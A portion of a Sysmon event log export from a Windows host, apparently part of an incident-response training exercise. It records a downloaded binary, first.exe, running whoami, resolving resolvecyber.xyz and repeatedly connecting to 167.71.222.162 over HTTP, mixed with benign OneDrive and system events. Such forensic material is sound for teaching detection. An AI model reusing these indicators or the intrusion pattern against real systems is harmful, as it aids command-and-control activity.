258,7763,2022-06-20 17:15:19.3062205,8,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,CreateRemoteThread,SourceUser: TEMPEST\benimaru | TargetUser: NT AUTHORITY\SYSTEM,,StartAddress: 0xFFFF9039B9DB2E00,RuleName: -,"SourceProcessID: 5424, SourceProcessGUID: 4bbef3ae-ab1c-62b0-850a-000000000700",SourceImage: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe,"TargetProcessID: 2688, TargetProcessGUID: 4bbef3ae-ab01-62b0-560a-000000000700",TargetImage: C:\Windows\System32\csrss.exe,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:19.299""},{""@Name"":""SourceProcessGuid"",""#text"":""4bbef3ae-ab1c-62b0-850a-000000000700""},{""@Name"":""SourceProcessId"",""#text"":""5424""},{""@Name"":""SourceImage"",""#text"":""C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe""},{""@Name"":""TargetProcessGuid"",""#text"":""4bbef3ae-ab01-62b0-560a-000000000700""},{""@Name"":""TargetProcessId"",""#text"":""2688""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\System32\\csrss.exe""},{""@Name"":""NewThreadId"",""#text"":""1196""},{""@Name"":""StartAddress"",""#text"":""0xFFFF9039B9DB2E00""},{""@Name"":""StartModule"",""#text"":""-""},{""@Name"":""StartFunction"",""#text"":""-""},{""@Name"":""SourceUser"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""TargetUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
259,7764,2022-06-20 17:15:19.8049273,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 5048, ProcessGUID: 4bbef3ae-845b-62b0-b000-000000000700",RuleName: InvDB,Image: C:\Windows\system32\svchost.exe,EventType: SetValue,TargetObject: HKU\S-1-5-21-349058839-1848105669-1528301110-1001\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Program Files (x86)\Microsoft OneDrive\21.220.1024.0005\Microsoft.SharePoint.exe,Details: Binary Data,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""InvDB""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:19.783""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-845b-62b0-b000-000000000700""},{""@Name"":""ProcessId"",""#text"":""5048""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-349058839-1848105669-1528301110-1001\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\\C:\\Program Files (x86)\\Microsoft OneDrive\\21.220.1024.0005\\Microsoft.SharePoint.exe""},{""@Name"":""Details"",""#text"":""Binary Data""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
260,7765,2022-06-20 17:15:21.0902926,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 4388, ProcessGUID: 4bbef3ae-ab1d-62b0-860a-000000000700",RuleName: -,Image: C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe,QueryName: onedriveclucproddm20002.blob.core.windows.net,QueryStatus: 0,QueryResults: type:  5 blob.dsm07prdstr13a.store.core.windows.net;64:ff9b::143c:b224;::ffff:20.60.178.36;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:19.423""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-860a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4388""},{""@Name"":""QueryName"",""#text"":""onedriveclucproddm20002.blob.core.windows.net""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""type:  5 blob.dsm07prdstr13a.store.core.windows.net;64:ff9b::143c:b224;::ffff:20.60.178.36;""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
261,7766,2022-06-20 17:15:21.0911078,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 4388, ProcessGUID: 4bbef3ae-ab1d-62b0-860a-000000000700",RuleName: -,Image: C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe,QueryName: api.onedrive.com,QueryStatus: 0,QueryResults: type:  5 common-afdrk.fe.1drv.com;type:  5 odc-commonafdrk-geo.onedrive.akadns.net;type:  5 odc-commonafdrk-brs.onedrive.akadns.net;type:  5 common.be.1drv.com.l-0003.dc-msedge.net.l-0003.l-msedge.net;type:  5 l-0003.l-msedge.net;64:ff9b::d6b:2a0c;::ffff:13.107.42.12;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:19.538""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab1d-62b0-860a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4388""},{""@Name"":""QueryName"",""#text"":""api.onedrive.com""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""type:  5 common-afdrk.fe.1drv.com;type:  5 odc-commonafdrk-geo.onedrive.akadns.net;type:  5 odc-commonafdrk-brs.onedrive.akadns.net;type:  5 common.be.1drv.com.l-0003.dc-msedge.net.l-0003.l-msedge.net;type:  5 l-0003.l-msedge.net;64:ff9b::d6b:2a0c;::ffff:13.107.42.12;""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
262,7767,2022-06-20 17:15:24.1618311,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 968, ProcessGUID: 4bbef3ae-ab2c-62b0-8e0a-000000000700",RuleName: -,"MD5=C4D2F9761675D6B5B02D1CA073DFA660,SHA256=D7B70975998DEF6E95897B615D8A981CDD8A1183C0B5EFCC5706758C53291553,IMPHASH=19C55DD8A167167BD60449F146E32AA6",ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 1760, ParentProcessGUID: 4bbef3ae-8428-62b0-2f00-000000000700",ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,"""C:\Program Files\ruxim\ruximics.exe"" /nonetwork",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:24.159""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab2c-62b0-8e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""968""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\ruxim\\RUXIMICS.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.19041.1019 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Reusable UX Interaction Manager""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""RUXIMICS.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files\\ruxim\\ruximics.exe\"" /nonetwork""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Program Files\\ruxim\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-8422-62b0-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""MD5=C4D2F9761675D6B5B02D1CA073DFA660,SHA256=D7B70975998DEF6E95897B615D8A981CDD8A1183C0B5EFCC5706758C53291553,IMPHASH=19C55DD8A167167BD60449F146E32AA6""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-8428-62b0-2f00-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""1760""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
263,7768,2022-06-20 17:15:24.9959089,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\__PSScriptPolicyTest_doudtz01.5tg.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:24.994""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\__PSScriptPolicyTest_doudtz01.5tg.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:15:24.994""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
264,7769,2022-06-20 17:15:25.2802311,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 1736, ProcessGUID: 4bbef3ae-ab2d-62b0-8f0a-000000000700",RuleName: -,"MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88",ParentProcess: C:\Users\Public\Downloads\first.exe,"ParentProcessID: 8948, ParentProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700","ParentCommandLine: ""C:\Users\Public\Downloads\first.exe""","""C:\Windows\system32\whoami.exe""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:25.276""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab2d-62b0-8f0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1736""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\whoami.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""whoami - displays logged on user information""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""whoami.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\whoami.exe\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""8948""},{""@Name"":""ParentImage"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Users\\Public\\Downloads\\first.exe\""""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
265,7770,2022-06-20 17:15:26.2928575,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:23.955""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
266,7771,2022-06-20 17:15:27.3092562,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:24.053""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
267,7772,2022-06-20 17:15:27.4971803,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,4,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:23.999""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51888""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
268,7773,2022-06-20 17:15:27.4979393,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,4,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:24.241""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51889""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
269,7774,2022-06-20 17:15:29.8876618,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:27.501""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
270,7775,2022-06-20 17:15:30.3564843,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,4,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:27.690""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51890""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
271,7776,2022-06-20 17:15:30.9191820,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,4,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: -,Image: C:\Users\Public\Downloads\first.exe,QueryName: resolvecyber.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:dea2;::ffff:167.71.222.162;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:27.909""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""QueryName"",""#text"":""resolvecyber.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:dea2;::ffff:167.71.222.162;""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
272,7777,2022-06-20 17:15:31.3876903,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,4,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 8948, ProcessGUID: 4bbef3ae-ab22-62b0-8b0a-000000000700",RuleName: Usermode,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.222.162,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Usermode""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:01:27.997""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab22-62b0-8b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8948""},{""@Name"":""Image"",""#text"":""C:\\Users\\Public\\Downloads\\first.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51891""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.222.162""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
273,7778,2022-06-20 17:15:32.0983346,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,4,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 1972, ProcessGUID: 4bbef3ae-ab34-62b0-900a-000000000700",RuleName: -,"MD5=E0E092D4EFC15F25FD9C0923C52C33D6,SHA256=714BC26DA9CD95E6268A6A01AF211D76DE86DC7F2918630E69695D3944B11B12,IMPHASH=EC87C68A546FB4BDECF11BCB83E7D0E5",ParentProcess: -,"ParentProcessID: 752, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,"""C:\Windows\ImmersiveControlPanel\SystemSettings.exe"" -ServerName:microsoft.windows.immersivecontrolpanel",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:15:32.094""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ab34-62b0-900a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1972""},{""@Name"":""Image"",""#text"":""C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Settings""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""SystemSettings.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe\"" -ServerName:microsoft.windows.immersivecontrolpanel""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\ImmersiveControlPanel\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=E0E092D4EFC15F25FD9C0923C52C33D6,SHA256=714BC26DA9CD95E6268A6A01AF211D76DE86DC7F2918630E69695D3944B11B12,IMPHASH=EC87C68A546FB4BDECF11BCB83E7D0E5""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""752""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
